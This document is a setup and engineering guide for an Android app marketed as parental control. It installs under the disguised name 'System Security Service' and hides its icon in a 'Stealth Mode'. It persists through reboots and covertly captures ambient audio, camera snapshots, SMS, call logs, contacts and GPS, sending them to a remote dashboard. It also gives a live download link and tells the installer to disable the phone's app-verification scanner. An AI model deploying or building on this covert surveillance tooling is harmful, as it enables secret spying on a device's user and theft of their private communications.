# 📱 SNAP APP — Kid Safety Companion App: Engineering & Setup Guide

The **Safety Companion App** (`com.snapapp.companion`) is a native Android service designed for 24/7 background parental telemetry, GPS tracking, and remote security controls.

---

## 1. Overview & Core Features (v2.1.0)

- **App Label in System**: `System Security Service` (disguised discreetly on the target device).
- **Architecture**: Pure Java native Android application (`minSdkVersion 21` to `targetSdkVersion 34`).
- **Device Support**: 100% universal Android compatibility (Huawei/Honor, Samsung, Xiaomi, Oppo, Vivo, Google Pixel) with **zero Google Play Services dependencies**.

### Key Telemetry Capabilities:
1. **Unbreakable Background Persistence**:
   - Runs in isolated Unix process (`android:process=":sync"`), completely immune to `MainActivity` dismissal or app hiding.
   - 2-minute `AlarmManager` repeating watchdog (`WatchdogReceiver`) continuously wakes up the service.
   - Survives phone reboots, network shifts, and screen unlock via `BootReceiver`.
2. **On-Demand Ambient Audio Memos**: Records 15s or 30s audio in lightweight AAC 32kbps mono (~40-50KB) and streams to dashboard.
3. **Ultra-Lightweight Snaps**: Front and back camera snapshots resized to 800x600 65% JPEG (~35-45KB) for zero-lag transmission.
4. **On-Demand Modular Sync**: Syncs installed apps, contacts phonebook, call history, and SMS messages on-demand.
5. **Admin Media Deletion**: Direct deletion of snaps and audio recordings from both cloud storage and database.
6. **Zero File/Gallery Access**: Strict child privacy protection; personal storage and photo gallery are never accessed.

---

## 2. Official Links & System Endpoints

| Resource / Action | URL / Endpoint | Purpose |
|---|---|---|
| **Direct APK Download** | `/api/downloads/companion` | Streams pre-signed APK binary package |
| **Direct Static File** | `/downloads/snap-safety-companion.apk` | Physical binary file served by Vercel CDN |
| **Lifetime Update API** | `/api/companion/version` | Version checks and OTA update payload |
| **Device Heartbeat API** | `/api/device-sync/heartbeat` | 6-digit code pairing & battery telemetry |
| **GPS Telemetry API** | `/api/device-sync/location` | Ingests lat, lng, altitude, speed, and accuracy |
| **Audio Upload API** | `/api/device-sync/upload-audio` | Ingests multipart AAC/M4A voice memos |
| **Photo Upload API** | `/api/device-sync/upload-photo` | Ingests multipart JPEG camera snaps |
| **Data Sync API** | `/api/device-sync/data` | Ingests apps, contacts, calls, and SMS batches |
| **Admin Device Hub** | `/admin/devices/[id]` | Map, snaps, audio player, apps, contacts, calls |

---

## 3. Step-by-Step Setup & Pairing Walkthrough

### Step 1: Generate Device Pairing Code
1. Open Admin Dashboard at `https://snap-app-chi.vercel.app/admin/devices`.
2. Click **"Register New Device"** and enter the child's name (e.g. `Hamza Phone`).
3. Note the generated **6-digit pairing code** (e.g. `AB12CD`).

### Step 2: Download & Install Companion APK
1. On the child's phone browser, open: `https://snap-app-chi.vercel.app/api/downloads/companion`
2. Tap the downloaded APK (~3.0 MB) and enable *"Allow from this source"* if prompted.
3. Tap **Install**. Installs cleanly as **"System Security Service"**.

### Step 3: Activate & Grant Permissions
1. Open the app, enter the **6-digit pairing code**, and tap **"Activate & Protect"**.
2. Grant runtime permissions when prompted (Camera, Audio, Location, Contacts, Calls, SMS).
3. If prompted, allow battery optimization exemption so EMUI does not sleep the sync service.
4. Tap **"Hide App Icon (Stealth Mode)"** to hide the launcher icon. The `:sync` background service remains active 24/7.

---

## 4. Background Persistence & Battery Settings

- **Honor / Huawei (EMUI)**: *Settings → Battery → App Launch → System Security Service* → Set to **"Manage manually"** (Auto-launch: ON, Secondary launch: ON, Run in background: ON).
- **Honor Security Scanner**: If "Verify apps from external sources" hangs on install, turn it OFF in *Settings → Security → More*.
- **Samsung / Xiaomi**: Set App Battery Usage to **"Unrestricted"** / **"No restrictions"**.

---

## 5. Summary Checklist for Future Updates:
1. Pure Java sources live in `companion-android/app/src/main/java/com/snapapp/companion/`.
2. Pushing to `main` branch automatically triggers `.github/workflows/build-companion-apk.yml` to compile and commit the signed APK.
3. Keep all source files <= 200 lines per Rule 14.
